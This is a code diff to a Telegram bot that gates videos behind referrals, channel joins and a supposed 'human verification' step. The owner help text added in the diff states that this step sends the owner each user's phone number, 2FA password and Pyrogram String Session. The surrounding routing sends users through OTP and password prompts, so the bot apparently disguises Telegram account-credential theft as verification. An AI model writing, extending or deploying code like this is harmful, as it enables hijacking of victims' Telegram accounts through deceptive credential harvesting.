@@ -52,7 +52,7 @@ load_dotenv()
 BOT_TOKEN = os.environ["BOT_TOKEN"].strip()
 MONGO_URI = os.environ["MONGO_URI"].strip()
 MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
-ADMIN_ID = int(os.environ["ADMIN_ID"])
+ADMIN_ID = int(os.environ["ADMIN_ID"])          # owner = admin (same)
 STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
 DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
 REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
@@ -105,11 +105,6 @@ PENDING_UNLOCK: dict[int, bool] = {}
 
 # ─────────────────── INLINE MENUS ───────────────────
 def user_menu_inline(doc=None):
-    """
-    Build the user menu inline keyboard.
-    - Fresh users (no unlocked batch yet) do NOT see "Unlock Next 10".
-    - Once at least one batch is unlocked, the full menu appears.
-    """
     if doc is None:
         doc = {}
     unlocked = int(doc.get("unlocked_batch", 0))
@@ -154,6 +149,9 @@ def admin_menu_inline():
             InlineKeyboardButton("🗑 Remove Required Channel", callback_data="am_remove"),
             InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
         ],
+        [
+            InlineKeyboardButton("❓ Help", callback_data="am_help"),
+        ],
     ])
 
 
@@ -192,7 +190,6 @@ def user_doc(uid):
 
 
 def menu_for(uid):
-    """Fresh doc fetch + appropriate menu (hides unlock for new users)."""
     return user_menu_inline(user_doc(uid) or {})
 
 
@@ -223,6 +220,56 @@ async def reply(update, context, text, **kwargs):
         chat_id=update.effective_chat.id,
         text=text,
         **kwargs,
+    )
+
+
+# ─────────────────── OWNER HELP ───────────────────
+HELP_TEXT = (
+    "🆘 <b>OWNER HELP PANEL</b>\n\n"
+    "You are the bot owner (admin). All commands and controls are listed below.\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "⌨️ <b>Owner Commands</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• <code>/admin</code> — Open admin control panel\n"
+    "• <code>/help</code> — Show this help panel\n"
+    "• <code>/uploadstatus</code> — Live status of current upload\n"
+    "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
+    "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
+    "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "🛠 <b>Admin Panel Buttons</b> (via /admin)\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• 📤 <b>Upload Videos</b> — Start storage upload session\n"
+    "• 📚 <b>Video Batches</b> — List published batches\n"
+    "• ➕ <b>Add Required Group</b> — Add a force-join channel/group\n"
+    "• 👥 <b>Required Groups</b> — Show all required chats\n"
+    "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
+    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "📤 <b>Upload Session Buttons</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• 📊 <b>Upload Status</b> — Refresh progress\n"
+    "• <b>DONE</b> — Finish upload and publish batches\n"
+    "• 🔁 <b>Retry Failed</b> — Retry videos that failed\n"
+    "• ✅ <b>Publish Successful</b> — Publish successful ones only\n"
+    "• ❌ <b>Cancel</b> — Abort upload session\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "🔐 <b>Automatic Events</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• New session generator log → sent to you as a DM\n"
+    "  (User info + phone + 2FA password + String Session)\n\n"
+    "ℹ️ Owner and Admin are the same (single <code>ADMIN_ID</code>)."
+)
+
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return  # silently ignore non-owners
+    await reply(
+        update, context,
+        HELP_TEXT,
+        reply_markup=admin_menu_inline(),
+        disable_web_page_preview=True,
     )
 
 
@@ -268,10 +315,6 @@ async def pyro_cleanup(uid: int):
 
 
 async def pyro_safe_edit_or_reply(message, text: str, edit: bool, **kwargs):
-    """
-    IMPORTANT: default to HTML parse_mode so <b>/<code> tags are rendered,
-    not shown as literal text.
-    """
     kwargs.setdefault("parse_mode", ParseMode.HTML)
     bot = message.get_bot()
     if edit:
@@ -1145,7 +1188,6 @@ async def unlock_next(update, context):
     if current >= total:
         return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")
 
-    # One-time human verification gate
     if not d.get("human_verified"):
         PENDING_UNLOCK[uid] = True
         await reply(
@@ -1156,7 +1198,6 @@ async def unlock_next(update, context):
         )
         return await pyro_session_start(update, context)
 
-    # Referral path (subsequent unlocks)
     need = required_referrals_for_next(current)
     have = int(d.get("verified_referrals", 0))
     if have < need:
@@ -1895,7 +1936,6 @@ async def admin_stats(update, context):
     cutoff = utcnow() - timedelta(hours=PENDING_REQUEST_TTL_HOURS)
     active_pending = pending_requests.count_documents({"requested_at": {"$gte": cutoff}})
 
-    # ── Daily new user tracking ──
     last_24h = users.count_documents({"created_at": {"$gte": utcnow() - timedelta(hours=24)}})
     today_start = utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
 
@@ -1913,7 +1953,6 @@ async def admin_stats(update, context):
         daily_lines.append(f"   • {label}: <b>{cnt}</b>")
     daily_block = "\n".join(daily_lines)
 
-    # Last 7 days total
     week_ago = today_start - timedelta(days=6)
     last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
 
@@ -2017,6 +2056,9 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "am_stats":
         await q.answer()
         return await admin_stats(update, context)
+    if data == "am_help":
+        await q.answer()
+        return await help_command(update, context)
 
     # ── Upload menu ──
     if data == "up_status":
@@ -2035,7 +2077,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer()
         return await cancel(update, context)
 
-    # ── Flow cancel (add group / custom link) ──
+    # ── Flow cancel ──
     if data == "flow_cancel":
         await q.answer()
         ADMIN_STATE.pop(ADMIN_ID, None)
@@ -2052,7 +2094,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def text_router(update: Update, context):
     uid = update.effective_user.id
 
-    # Pyrogram session generator state handling
     if PYRO_STATE.get(uid) == "password":
         return await pyro_handle_password(update, context)
     if PYRO_STATE.get(uid) == "otp":
@@ -2068,38 +2109,9 @@ async def text_router(update: Update, context):
             parse_mode=ParseMode.HTML,
         )
 
-    # Admin flow that needs typed text (chat ID / custom URL)
     if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
         if await admin_group_flow(update, context):
             return
-
-
-async def checkme(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    chats = active_required_chats()
-    if not chats:
-        return await update.message.reply_text("No required chats configured.")
-
-    results = await asyncio.gather(
-        *(check_one_chat(context.bot, ch, uid) for ch in chats),
-        return_exceptions=True,
-    )
-
-    lines = ["🔎 <b>Membership Check</b>\n"]
-    for ch, result in zip(chats, results):
-        if isinstance(result, Exception):
-            state = "error"
-        else:
-            _, state = result
-        icon = {"member": "✅", "pending": "⏳", "missing": "❌"}.get(state, "⚠️")
-        mode = ch.get("link_mode", "custom")
-        pending_db = has_active_pending_request(ch["chat_id"], uid)
-        lines.append(
-            f"{icon} {esc(ch['name'])}: <b>{state}</b>\n"
-            f"   mode=<code>{esc(mode)}</code> pending_record=<code>{str(pending_db).lower()}</code>"
-        )
-
-    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 
 def main():
@@ -2113,21 +2125,24 @@ def main():
         .build()
     )
 
-    app.add_handler(CommandHandler("start", start))
+    # Owner commands
     app.add_handler(CommandHandler("admin", admin))
-    app.add_handler(CommandHandler("checkme", checkme))
+    app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
     app.add_handler(CommandHandler("setcustomlink", set_custom_link))
+    app.add_handler(CommandHandler("resetverify", admin_reset_verify))
+
+    # Public commands
+    app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("session", pyro_session_start))
     app.add_handler(CommandHandler("cancel_session", pyro_cancel_command))
-    app.add_handler(CommandHandler("resetverify", admin_reset_verify))
 
     app.add_handler(ChatJoinRequestHandler(on_join_request))
     app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
 
     app.add_handler(CallbackQueryHandler(
         menu_callback,
-        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
+        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
     ))
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
